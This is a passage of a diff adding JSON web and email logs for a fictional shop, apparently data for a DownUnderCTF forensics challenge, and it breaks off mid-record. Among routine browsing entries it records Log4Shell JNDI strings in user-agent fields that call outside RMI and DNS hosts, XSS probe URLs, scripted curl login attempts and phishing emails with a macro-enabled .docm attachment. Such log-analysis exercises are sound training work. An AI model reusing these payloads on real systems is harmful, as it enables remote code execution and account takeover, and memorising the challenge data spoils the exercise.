@@ -1,0 +1,3448 @@
+{
+    "_time": "2021-01-01T09:05:01.000+0000",
+    "origin": "125.168.15.92",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:15:50.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "support@shop.downunderctf.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:15:50.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "support@shop.downunderctf.com",
+    "direction": "Incoming",
+    "outcome": "Delivered",
+    "subject": "Your shop.downunderctf.com Password Has Been Changed",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:17:07.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:07.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:05.000+0000",
+    "origin": "203.35.134.222",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:19.000+0000",
+    "origin": "203.35.134.222",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "url": "shop.downunderctf.com/product?id=2",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:34.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "ads.google.com",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:27:22.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "${jndi:rmi://138.197.102.252:34129/index}",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:43.000+0000",
+    "origin": "121.208.54.156",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "${jndi:rmi://138.197.102.252:34129/index}",
+    "url": "shop.downunderctf.com/Login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:26:44.000+0000",
+    "origin": "51.83.253.131",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "${jndi:dns://188.126.89.151:2864:2053/pixel.gif}",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:51.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:12.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/browse",
+   "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:22.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:37.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:09.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:27.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/register",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:51.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:57.000+0000",
+    "origin": "144.138.98.209",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
+    "url": "shop.downunderctf.com/orderconfirm",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:19.000+0000",
+    "origin": "144.137.100.1",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "ads.facebook.com",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:28.000+0000",
+    "origin": "144.137.100.1",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:59.000+0000",
+    "origin": "144.137.100.1",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=4",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:55.000+0000",
+    "origin": "144.137.100.1",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=4",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:24.000+0000",
+    "origin": "144.137.100.1",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=5",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:47.000+0000",
+    "origin": "144.137.100.1",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=5",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:09:33.000+0000",
+    "origin": "180.150.80.150",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "gmail.com",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:09:50.000+0000",
+    "origin": "180.150.80.150",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:36:35.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "staikos@gmail.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#724",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:36:35.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "jimxugle@icloud.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#723",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:31:18.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "bhtower@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#722",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:24:57.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "skaufman@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Thank you for registering your shop.downunderctf.com account",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:32:01.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:32:01.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:34:28.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=9",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=9",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:34:44.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/product?id=5",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/product?id=5",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:35:11.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=5",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/checkout",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:35:27.000+0000",
+    "origin": "101.184.43.241",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/checkout",
+    "useragent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.1)",
+    "url": "shop.downunderctf.com/register",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:25:28.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "skaufman@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#721",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:23:01.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "notaprguy@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#720",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:22:21.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "falcao@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Thank you for registering your shop.downunderctf.com account",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:22:48.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "falcao@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#719",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:14:09.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "feamster@live.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Thank you for registering your shop.downunderctf.com account",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:14:57.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "feamster@live.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#718",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:13:57.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "froodian@hotmail.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#717",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:05:33.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "goresky@gmail.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Thank you for registering your shop.downunderctf.com account",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:06:33.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "goresky@gmail.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#716",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:10:09.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/ref=sr_1_11?dchild=1&keywords=hacking101&qid=1630480052&sr=8-11",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:15.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/browse",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:27.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=1",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:11:41.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=1",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=<script>alert(1)</script>",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:01.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=<script>alert(1)</script>",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/product?id=%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:14.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/product?id=%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:40.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:12:55.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:03.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:13:11.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/login",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:01.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:01.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:02.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:02.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:03.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:14:03.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:31.000+0000",
+    "origin": "203.35.134.222",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "url": "shop.downunderctf.com/product?id=7",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:10:53.000+0000",
+    "origin": "203.35.134.222",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/browse",
+    "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "url": "shop.downunderctf.com/product?id=8",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:15:35.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/account",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:15:48.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/changepassword",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:15:50.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "GET",
+    "referer": "shop.downunderctf.com/changepassword",
+    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
+    "url": "shop.downunderctf.com/login?ref=YjUwNmZiMGNhYmI2MGU5ZjExMzJkYWE3MmRmNGQ1Njc6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:08.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:09.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:09.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:12.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:12.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:13.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:13.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:14.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:02:10.000+0000",
+    "sender": "faxinfo@web.de",
+    "recipient": "support@shop.downunderctf.com",
+    "direction": "Incoming",
+    "outcome": "Block-Spam",
+    "subject": "Important Tax Fax Details",
+    "attachments": "Downunderctf-FaxReport.docm",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:13:39.000+0000",
+    "sender": "noreply@ato.com.au",
+    "recipient": "support@shop.downunderctf.com",
+    "direction": "Incoming",
+    "outcome": "Delivered",
+    "subject": "Important Tax Fax Details",
+    "attachments": "Downunderctf-FaxReport.docm",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:08:39.000+0000",
+    "sender": "bob123@gmail.com",
+    "recipient": "support@shop.downunderctf.com",
+    "direction": "Incoming",
+    "outcome": "Delivered",
+    "subject": "OrderID - #16042",
+    "attachments": "attachment.png",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:55:22.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "wayward@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "Thank you for registering your shop.downunderctf.com account",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:56:23.000+0000",
+    "sender": "noreply@shop.downunderctf.com",
+    "recipient": "wayward@outlook.com",
+    "direction": "Outgoing",
+    "outcome": "Unknown",
+    "subject": "shop.downunderctf.com - Order#727",
+    "attachments": "null",
+    "logSource": "Webmail"
+} {
+    "_time": "2021-01-01T09:17:14.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:15.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
+    "logSource": "Http:Web"
+} {
+    "_time": "2021-01-01T09:17:15.000+0000",
+    "origin": "58.164.62.91",
+    "site": "shop.downunderctf.com",
+    "method": "POST",
+    "referer": "null",
+    "useragent": "curl/7.64.1",
+    "url": "shop.downunderctf.com/login",
